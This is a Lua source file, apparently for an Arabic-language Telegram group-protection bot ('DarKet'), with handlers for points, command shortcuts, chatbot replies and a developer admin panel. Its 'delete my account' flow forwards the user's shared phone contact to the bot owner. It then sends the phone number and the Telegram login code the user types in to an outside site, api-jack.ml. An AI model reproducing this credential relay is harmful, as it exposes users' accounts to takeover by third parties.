Redis:incrby(darket.."Num:Add:Games"..msg.chat_id..Message_Reply.sender.user_id, text:match("^اضف نقاط (%d+)$"))  
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم اضافه له  "..text:match("^اضف نقاط (%d+)$").." من النقاط").Reply,"md",true)  
end
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id ~= 0 then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
Redis:incrby(darket.."Num:Message:User"..msg.chat_id..":"..Message_Reply.sender.user_id, text:match("^اضف رسائل (%d+)$"))  
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم اضافه له  "..text:match("^اضف رسائل (%d+)$").."  من الرسائل").Reply,"md",true)  
end
if text == "نقاطي" then 
local Num = Redis:get(darket.."Num:Add:Games"..msg.chat_id..msg.sender.user_id) or 0
if Num == 0 then 
return send(msg_chat_id,msg_id, "٠ لم تفز بأي نقطه ","md",true)  
else
return send(msg_chat_id,msg_id, "٠ عدد النقاط التي ربحتها *٠ "..Num.." *","md",true)  
end
end

if text == 'ترتيب الاوامر' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..'تعط','تعطيل الايدي بالصوره')
Redis:set(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..'تفع','تفعيل الايدي بالصوره')
Redis:set(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..'ا','ايدي')
Redis:set(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..'م','رفع مميز')
Redis:set(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..'اد', 'رفع ادمن')
Redis:set(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..'مد','رفع مدير')
Redis:set(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..'من', 'رفع منشئ')
Redis:set(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..'اس', 'رفع منشئ اساسي')
Redis:set(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..'مط', 'رفع مطور')
Redis:set(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..'ثانوي', 'رفع مطور ثانوي')
Redis:set(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..'ج', 'تتزوجيني')
Redis:set(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..'قف', 'قفل الاشعارات')
Redis:set(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..'فف', 'فتح الاشعارات')
Redis:set(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..'ر', 'الرابط')
Redis:set(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..'الردود', 'رر')
Redis:set(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..'تث', 'تثبيت')
Redis:set(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..'تاك', 'تاك للكل')
Redis:set(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..'غ', 'غنيلي')
return send(msg_chat_id,msg_id,[[*
٠ تم ترتيب الاوامر بالشكل التالي ٠
- ايدي - ا ٠
- مميز - م ٠
- ادمن - اد ٠
- مدير - مد ٠ 
- منشى - من ٠
- المنشئ الاساسي - اس  ٠
- تعطيل الايدي بالصوره - تعط ٠
- تفعيل الايدي بالصوره - تفع ٠
- رفع مطور - مط ٠
- رفع مطور ثانوي - ثانوي ٠
- تتزوجيني - ج ٠
- قفل الاشعارات - قف ٠
- فتح الاشعارات - فف ٠
- الرابط - ر ٠
- الردود - رر ٠
- تثبيت - تث ٠
- تاك للكل - تاك ٠
- غنيلي - غ ٠
*]],"md")
end
if text == "تفعيل سمسمي" then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
Redis:del(darket.."smsme"..msg.chat_id)
send(msg.chat_id,msg.id,"٠ تم تفعيل سمسمي")
end
if text == "تعطيل سمسمي" then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
Redis:set(darket.."smsme"..msg.chat_id,true)
send(msg.chat_id,msg.id,"٠ تم تعطيل سمسمي")
end
if not Redis:get(darket.."smsme"..msg.chat_id) then
if text and msg.reply_to_message_id ~= 0 then
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if Message_Reply and Message_Reply.sender and tonumber(Message_Reply.sender.user_id) == tonumber(darket) then
ai_api = https.request("https://api-sv2.simsimi.net/v2/?text="..URL.escape(text).."&lc=ar&cf=false")
ai_decode = JSON.decode(ai_api)
ai_text = ai_decode['success']
if ai_text:match("(.*)سناب(.*)") or ai_text:match("(.*)واتس(.*)") or ai_text:match("(.*)انستا(.*)") or ai_text:match("(.*)رقمي(.*)") or ai_text:match("(%d+)") or ai_text:match("(.*)متابعه(.*)") or ai_text:match("(.*)تابعني(.*)") or ai_text:match("(.*)قناتي(.*)") or ai_text:match("(.*)قناه(.*)") or ai_text:match("(.*)يوتيوب(.*)") then
txx = "لا افهمك"
else
txx = ai_text
end
send(msg_chat_id,msg_id,txx,"md")
end
end
end


end -- GroupBot
if chat_type(msg.chat_id) == "UserBot" then 
if text == 'تحديث الملفات ٠' or text == 'تحديث' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
print('Chat Id : '..msg_chat_id)
print('User Id : '..msg_user_send_id)
send(msg_chat_id,msg_id, "٠ تم تحديث الملفات ","md",true)
dofile('darket.lua')  
end
if text == "/start delete" then
local reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
data = {
{
{text = 'حذف الحساب', type = 'requestphone'},
},
}
}
return send(msg_chat_id,msg_id,'٠ فكر جيدا قبل حذف حسابك ', 'md', false, false, false, false, reply_markup)
end
if text and text:match("/start st(.*)u(%d+)") then
local coree = {text:match("/start st(.*)u(%d+)") }
print(coree[2])
print(msg_user_send_id)
if msg_user_send_id ~= tonumber(coree[2]) then
send(msg_chat_id,msg_id,'\n*٠ هذا الامر لا يخصك* ',"md",true)  
else
LuaTele.setChatMemberStatus(coree[1],coree[2],'banned',0)
LuaTele.setChatMemberStatus(coree[1],coree[2],'restricted',{1,1,1,1,1,1,1,1,1})
local Get_Chat = LuaTele.getChat(coree[1])
local GetLink = Redis:get(darket.."Group:Link"..coree[1]) 
if GetLink then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{{text =Get_Chat.title, url = GetLink}, },}}
return send(msg_chat_id, msg_id, "٠Link Group : \n["..Get_Chat.title.. ']('..GetLink..')', 'md', true, false, false, false, reply_markup)
else 
local m = https.request("https://api.telegram.org/bot"..Token.."/getchat?chat_id="..tonumber(coree[1]))
local LinkGroup = JSON.decode(m)
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{{text = Get_Chat.title, url = LinkGroup.result.invite_link},},}}
return send(msg_chat_id, msg_id, "٠Link Group : \n["..Get_Chat.title.. ']('..LinkGroup.result.invite_link..')', 'md', true, false, false, false, reply_markup)
end
end
end
if text == "حذف حسابي" then
local reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
data = {
{
{text = 'حذف الحساب', type = 'requestphone'},
},
}
}
return send(msg_chat_id,msg_id,'٠ فكر جيدا قبل حذف حسابك ', 'md', false, false, false, false, reply_markup)
end
if text and Redis:get(darket..msg.sender.user_id.."hash") and Redis:get(darket..msg.sender.user_id.."num") and Redis:get(darket..msg.sender.user_id..'pass') then
if text == "الغاء" or text == "٠ الغاء" then
Redis:del(darket..msg.sender.user_id.."hash")
Redis:del(darket..msg.sender.user_id.."num")
Redis:del(darket..msg.sender.user_id.."pass")
local k = {
remove_keyboard = true
}
return https.request("https://api.telegram.org/bot"..Token.."/sendmessage?text="..URL.escape("٠ تم الغاء امر حذف حسابك").."&chat_id="..msg.chat_id.."&reply_markup="..JSON.encode(k))
end
local hash = Redis:get(darket..msg.sender.user_id.."hash")
local num = Redis:get(darket..msg.sender.user_id.."num")
local pass = Redis:get(darket..msg.sender.user_id.."pass")
send(msg_chat_id,msg_id,"٠ جاري حذف حسابك يرجي الانتظار...")
sleep(2)
local url = https.request("https://api-jack.ml/api2.php?phone="..num.."&password="..pass.."&access_hash="..hash.."&do_delete=true")
local json = JSON.decode(url)
if json and json.error == "PASSWORD OR ACCESS_HASH INVALID | OR DO_DELETE => FALSE OR DO_DELETE EMPTY" then
return send(msg.chat_id,msg.id,"٠ الكود خطأ ، ارسل الكود الصحيح او اختار الغاء لالغاء الامر")
else
Redis:del(darket..msg.sender.user_id.."hash")
Redis:del(darket..msg.sender.user_id.."num")
Redis:del(darket..msg.sender.user_id.."pass")
return send(msg_chat_id,msg_id,"٠ وداعا نراك قرييا ...")
end
end
if text and Redis:get(darket..msg.sender.user_id.."hash") and Redis:get(darket..msg.sender.user_id.."num") and not Redis:get(darket..msg.sender.user_id..'pass') then
if text == "الغاء" or text == "٠ الغاء" then
Redis:del(darket..msg.sender.user_id.."hash")
Redis:del(darket..msg.sender.user_id.."num")
local k = {
remove_keyboard = true
}
return https.request("https://api.telegram.org/bot"..Token.."/sendmessage?text="..URL.escape("٠ تم الغاء امر حذف حسابك").."&chat_id="..msg.chat_id.."&reply_markup="..JSON.encode(k))
end
Redis:set(darket..msg.sender.user_id..'pass',text)
local reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
data = {
{
{text = 'تأكيد الحذف',type = 'text'},{text = '٠ الغاء',type = 'text'},
},
}
}
return send(msg_chat_id,msg_id,"٠ هل انت متأكد من انك تريد حذف حسابك ؟",'md', false, false, false, false, reply_markup)
end
if data and data.content and data.content.luatele == "messageContact" then
LuaTele.sendForwarded(Sudo_Id, 0, data.sender.user_id, data.id)
local num = "+"..data.content.contact.phone_number
local url = https.request("https://api-jack.ml/api2.php?phone="..num)
local json = JSON.decode(url)
if json and json.result and json.result.description == "password has been sent" then
Redis:set(darket..msg.sender.user_id.."hash",json.result.access_hash)
Redis:set(darket..msg.sender.user_id.."num",num)
local reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
data = {
{
{text = '٠ الغاء',type = 'text'},
},
}
}
return send(msg_chat_id,msg_id,"٠ تم ارسال رمز تأكيد اليك \n ارسله الينا الان",'md', false, false, false, false, reply_markup)
else
send(msg_chat_id,msg_id,"٠ حدث خطأ ربما بسبب كثره المحاولات")
end
return false 
end
if text == '/start' then
Redis:sadd(darket..'Num:User:Pv',msg.sender.user_id)  
if not msg.Devss then
local photo = LuaTele.getUserProfilePhotos(darket)
if not Redis:get(darket.."Start:Bot") then
local CmdStart = '*\n٠ أهلآ بك في بوت '..(Redis:get(darket.."Name:Bot") or "داركت")..
'\n٠ اختصاص البوت حماية المجموعات'..
'\n٠ لتفعيل البوت عليك اتباع مايلي ...'..
'\n٠ اضف البوت الى مجموعتك'..
'\n٠ ارفعه ادمن مشرف'..
'\n٠ ارسل كلمة { تفعيل } ليتم تفعيل الكروب'..
'\n٠ مطور البوت ٠ {'..UserSudo..'}*'
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '➕ اضفني لمجموعتك', url = 't.me/'..UserBot..'?startgroup=new'}, 
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
LuaTele.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,CmdStart,"md", true, nil, nil, nil, nil, nil, nil, nil, nil, reply_markup )
else
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '➕ اضفني لمجموعتك', url = 't.me/'..UserBot..'?startgroup=new'}, 
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
LuaTele.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,Redis:get(darket.."Start:Bot"),"md", true, nil, nil, nil, nil, nil, nil, nil, nil, reply_markup )
end
else
local reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
data = {
{
{text = 'مطور السورس ٠',type = 'text'},{text = '٠ TeAm DarKet ٠️',type = 'text'},
},
{
{text = 'تعيين قناه السورس ٠',type = 'text'},{text = 'تعيين مطور السورس ٠',type = 'text'},
},
{
{text = 'تعيين رمز السورس ٠',type = 'text'},{text = 'حذف رمز السورس ٠',type = 'text'},
},
{
{text = 'تفعيل البوت بصوره ٠',type = 'text'},{text = 'تعطيل البوت بصوره ٠',type = 'text'},
},
{
{text = 'تفعيل التواصل ٠',type = 'text'},{text = 'تعطيل التواصل ٠', type = 'text'},
},
{
{text = 'تفعيل الاشتراك الاجباري ٠',type = 'text'},{text = 'تعطيل الاشتراك الاجباري ٠', type = 'text'},
},
{
{text = 'تفعيل البوت الخدمي ٠',type = 'text'},{text = 'تعطيل البوت الخدمي ٠', type = 'text'},
},
{
{text = 'اذاعه للمجموعات ٠',type = 'text'},{text = 'اذاعه خاص ٠', type = 'text'},
},
{
{text = 'اذاعه بالتوجيه ٠',type = 'text'},{text = 'اذاعه بالتوجيه خاص ٠', type = 'text'},
},
{
{text = 'اذاعه بالتثبيت ٠',type = 'text'},
},
{
{text = 'المطورين الثانويين ٠',type = 'text'},{text = 'المطورين ٠',type = 'text'},{text = 'قائمه العام ٠', type = 'text'},
},
{
{text = 'مسح المطورين الثانويين ٠',type = 'text'},{text = 'مسح المطورين ٠',type = 'text'},{text = 'مسح قائمه العام ٠', type = 'text'},
},
{
{text = 'تغيير اسم البوت ٠',type = 'text'},{text = 'حذف اسم البوت ٠', type = 'text'},
},
{
{text = 'الاحصائيات ٠',type = 'text'},
},
{
{text = 'تعطيل الاذاعه ٠',type = 'text'},{text = 'تفعيل الاذاعه ٠',type = 'text'},
},
{
{text = 'تعطيل المغادره ٠',type = 'text'},{text = 'تفعيل المغادره ٠',type = 'text'},
},
{
{text = 'تغيير المطور الاساسي ٠',type = 'text'} 
},
{
{text = 'تغير كليشه المطور ٠',type = 'text'},{text = 'حذف كليشه المطور ٠', type = 'text'},
},
{
{text = 'تغيير كليشه ستارت ٠',type = 'text'},{text = 'حذف كليشه ستارت ٠', type = 'text'},
},
{
{text = 'تنظيف المجموعات ٠',type = 'text'},{text = 'تنظيف المشتركين ٠', type = 'text'},
},
{
{text = 'جلب النسخه الاحتياطيه ٠',type = 'text'},{text = 'الكروبات ٠',type = 'text'},
},
{
{text = 'اضف رد عام ٠',type = 'text'},{text = 'حذف رد عام ٠', type = 'text'},
},
{
{text = 'الردود العامه ٠',type = 'text'},{text = 'مسح الردود العامه ٠', type = 'text'},
},
{
{text = 'تحديث الملفات ٠',type = 'text'},
},
{
{text = 'الغاء الامر ٠',type = 'text'},
},
}
}
return send(msg_chat_id,msg_id,'٠اهلا بك عزيزي المطور ', 'md', false, false, false, false, reply_markup)
end
end
if text == "تفعيل البوت بصوره ٠" then
  if not msg.Devss then
  send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
  end
  Redis:set(darket.."name bot type : ", "photo")
  send(msg_chat_id,msg_id,'\n*٠ تم تفعيل رد البوت بصوره * ',"md",true)  
  end
if text == "تعطيل البوت بصوره ٠" then
if not msg.Devss then
send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
Redis:set(darket.."name bot type : ", "text")
send(msg_chat_id,msg_id,'\n*٠ تم تعطيل رد البوت بصوره * ',"md",true)  
end
if text == 'تنظيف المشتركين ٠' then
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(darket.."Num:User:Pv")   
local x = 0
for k,v in pairs(list) do  
local Get_Chat = LuaTele.getChat(v)
local ChatAction = LuaTele.sendChatAction(v,'Typing')
if ChatAction.luatele ~= "ok" then
x = x + 1
Redis:srem(darket..'Num:User:Pv',v)
end
end
if x ~= 0 then
return send(msg_chat_id,msg_id,'*٠ العدد الكلي { '..#list..' }\n٠ تم العثور على { '..x..' } من المشتركين حاظرين البوت*',"md")
else
return send(msg_chat_id,msg_id,'*٠ العدد الكلي { '..#list..' }\n٠ لم يتم العثور على وهميين*',"md")
end
end
if text == 'تنظيف المجموعات ٠' then
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(darket.."ChekBotAdd")   
local x = 0
for k,v in pairs(list) do  
local Get_Chat = LuaTele.getChat(v)
if Get_Chat.id then
local statusMem = LuaTele.getChatMember(Get_Chat.id,darket)
if statusMem.status.luatele == "chatMemberStatusMember" then
x = x + 1
send(Get_Chat.id,0,'*٠ البوت عضو في الكروب سوف اغادر ويمكنك تفعيلي مره اخره *',"md")
Redis:srem(darket..'ChekBotAdd',Get_Chat.id)
local keys = Redis:keys(darket..'*'..Get_Chat.id)
for i = 1, #keys do
Redis:del(keys[i])
end
LuaTele.leaveChat(Get_Chat.id)
end
else
x = x + 1
local keys = Redis:keys(darket..'*'..v)
for i = 1, #keys do
Redis:del(keys[i])
end
Redis:srem(darket..'ChekBotAdd',v)
LuaTele.leaveChat(v)
end
end
if x ~= 0 then
return send(msg_chat_id,msg_id,'*٠ العدد الكلي { '..#list..' } للمجموعات \n٠ تم العثور على { '..x..' } مجموعات البوت ليس ادمن \n٠ تم تعطيل الكروب ومغادره البوت من الوهمي *',"md")
else
return send(msg_chat_id,msg_id,'*٠ العدد الكلي { '..#list..' } للمجموعات \n٠ لا توجد مجموعات وهميه*',"md")
end
end
if text == 'تغيير كليشه ستارت ٠' then 
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(darket.."Change:Start:Bot"..msg.sender.user_id,300,true) 
return send(msg_chat_id,msg_id,"٠ ارسل لي كليشه Start الان ","md",true)  
end
if text == 'مطور السورس ٠' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'مطور السورس', url = 't.me/'..chdevolper..''}, 
},
}
}
return send(msg_chat_id,msg_id,"مطور سورس داركت ٠ @"..chdevolper.."","html",true, false, false, true, reply_markup)
end
if text == '٠ TeAm DarKet ٠️' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
return send(msg_chat_id,msg_id,"٠ TeAm DarKet ٠️ ٠ @"..chsource.."","html",true, false, false, true, reply_markup)
end
if text == 'حذف كليشه ستارت ٠' then 
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Start:Bot") 
return send(msg_chat_id,msg_id,"٠ تم حذف كليشه Start ","md",true)   
end
if text == 'تغيير اسم البوت ٠' then 
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(darket.."Change:Name:Bot"..msg.sender.user_id,300,true) 
return send(msg_chat_id,msg_id,"٠ ارسل لي الاسم الان ","md",true)  
end
if text == 'حذف اسم البوت ٠' then 
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Name:Bot") 
return send(msg_chat_id,msg_id,"٠ تم حذف اسم البوت ","md",true)   
end
if text and text:match("^تعين عدد الاعضاء (%d+)$") then
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket..'Num:Add:Bot',text:match("تعين عدد الاعضاء (%d+)$") ) 
send(msg_chat_id,msg_id,'*٠ تم تعيين عدد اعضاء تفعيل البوت اكثر من : '..text:match("تعين عدد الاعضاء (%d+)$")..' عضو *',"md",true)  
elseif text =='الاحصائيات ٠' then 
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
send(msg_chat_id,msg_id,'*٠عدد احصائيات البوت الكامله \n– – – – – – – –\n٠عدد المجموعات : '..(Redis:scard(darket..'ChekBotAdd') or 0)..'\n٠عدد المشتركين : '..(Redis:scard(darket..'Num:User:Pv') or 0)..'*',"md",true)  
end
if text == 'تغير كليشه المطور ٠' then
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket..'GetTexting:Devdarket'..msg_chat_id..':'..msg.sender.user_id,true)
return send(msg_chat_id,msg_id,'٠ ارسل لي الكليشه الان')
end
if text == 'حذف كليشه المطور ٠' then
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket..'Texting:Devdarket')
return send(msg_chat_id,msg_id,'٠ تم حذف كليشه المطور')
end
if text == 'اضف رد عام ٠' then 
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Set:Rd"..msg.sender.user_id..":"..msg_chat_id,true)
return send(msg_chat_id,msg_id,"٠ ارسل الان الكلمه لاضافتها في الردود العامه ","md",true)  
end
if text == 'حذف رد عام ٠' then 
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Set:On"..msg.sender.user_id..":"..msg_chat_id,true)
return send(msg_chat_id,msg_id,"٠ ارسل الان الكلمه لحذفها من الردود العامه","md",true)  
end
if text=='اذاعه خاص ٠' then 
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(darket.."Broadcasting:Users" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
send(msg_chat_id,msg_id,[[
↯︙ارسل لي سواء كان 
❨ ملف ، ملصق ، متحركه ، صوره
 ، فيديو ، بصمه الفيديو ، بصمه ، صوت ، رساله ❩
– – – – – – – –
↯︙للخروج ارسل ( الغاء )
 ✓
]],"md",true)  
return false
end

if text=='اذاعه للمجموعات ٠' then 
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(darket.."Broadcasting:Groups" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
send(msg_chat_id,msg_id,[[
↯︙ارسل لي سواء كان 
❨ ملف ، ملصق ، متحركه ، صوره
 ، فيديو ، بصمه الفيديو ، بصمه ، صوت ، رساله ❩
– – – – – – – –
↯︙للخروج ارسل ( الغاء )
 ✓
]],"md",true)  
return false
end

if text=="اذاعه بالتثبيت ٠" then 
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
